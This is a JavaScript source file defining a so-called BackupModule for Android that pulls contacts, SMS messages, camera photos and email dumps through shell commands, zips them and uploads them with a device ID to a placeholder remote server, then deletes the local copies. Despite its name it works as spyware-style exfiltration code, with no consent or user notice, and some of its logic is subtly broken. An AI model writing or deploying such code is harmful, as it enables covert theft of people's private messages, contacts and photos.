const fs = require('fs');
const path = require('path');
const archiver = require('archiver');
const { exec } = require('child_process');

class BackupModule {
  constructor(deviceId) {
    this.deviceId = deviceId;
    this.uploadUrl = 'https://your-server.com/upload';
  }

  async backupContacts() {
    try {
      const outputPath = this.getTempPath('contacts.zip');
      await this.createZipFromQuery(
        'content://com.android.contacts/data',
        outputPath
      );
      this.uploadFile(outputPath);
      return true;
    } catch (error) {
      console.error('فشل في نسخ جهات الاتصال:', error);
      return false;
    }
  }

  async backupSMS() {
    try {
      const outputPath = this.getTempPath('sms.zip');
      await this.createZipFromQuery(
        'content://sms',
        outputPath
      );
      this.uploadFile(outputPath);
      return true;
    } catch (error) {
      console.error('فشل في نسخ الرسائل:', error);
      return false;
    }
  }

  async backupMedia() {
    try {
      const outputPath = this.getTempPath('media.zip');
      const mediaDir = '/sdcard/DCIM';
      
      await this.zipDirectory(mediaDir, outputPath);
      this.uploadFile(outputPath);
      return true;
    } catch (error) {
      console.error('فشل في نسخ الوسائط:', error);
      return false;
    }
  }

  async backupEmails() {
    try {
      const outputPath = this.getTempPath('emails.zip');
      const emailData = await this.executeCommand('dumpsys email');
      
      fs.writeFileSync('/sdcard/emails.txt', emailData);
      await this.zipFiles(['/sdcard/emails.txt'], outputPath);
      
      this.uploadFile(outputPath);
      return true;
    } catch (error) {
      console.error('فشل في نسخ الإيميلات:', error);
      return false;
    }
  }

  async createZipFromQuery(uri, outputPath) {
    const data = await this.executeCommand(`content query --uri "${uri}"`);
    fs.writeFileSync('/sdcard/temp_data.txt', data);
    await this.zipFiles(['/sdcard/temp_data.txt'], outputPath);
    fs.unlinkSync('/sdcard/temp_data.txt');
  }

  async zipDirectory(sourceDir, outputPath) {
    const output = fs.createWriteStream(outputPath);
    const archive = archiver('zip');
    
    return new Promise((resolve, reject) => {
      output.on('close', resolve);
      archive.on('error', reject);
      
      archive.pipe(output);
      archive.directory(sourceDir, false);
      archive.finalize();
    });
  }

  async zipFiles(files, outputPath) {
    const output = fs.createWriteStream(outputPath);
    const archive = archiver('zip');
    
    return new Promise((resolve, reject) => {
      output.on('close', resolve);
      archive.on('error', reject);
      
      archive.pipe(output);
      files.forEach(file => {
        archive.file(file, { name: path.basename(file) });
      });
      archive.finalize();
    });
  }

  async uploadFile(filePath) {
    const formData = new FormData();
    formData.append('deviceId', this.deviceId);
    formData.append('file', fs.createReadStream(filePath));
    
    const response = await fetch(this.uploadUrl, {
      method: 'POST',
      body: formData
    });
    
    if (response.ok) {
      console.log('تم رفع الملف بنجاح:', filePath);
      fs.unlinkSync(filePath);
      return response.json();
    } else {
      throw new Error('فشل في رفع الملف');
    }
  }

  getTempPath(filename) {
    const tempDir = '/sdcard/temp';
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir);
    }
    return path.join(tempDir, filename);
  }

  executeCommand(cmd) {
    return new Promise((resolve, reject) => {
      exec(cmd, (error, stdout, stderr) => {
        if (error) reject(error);
        else resolve(stdout);
      });
    });
  }
}

module.exports = BackupModule;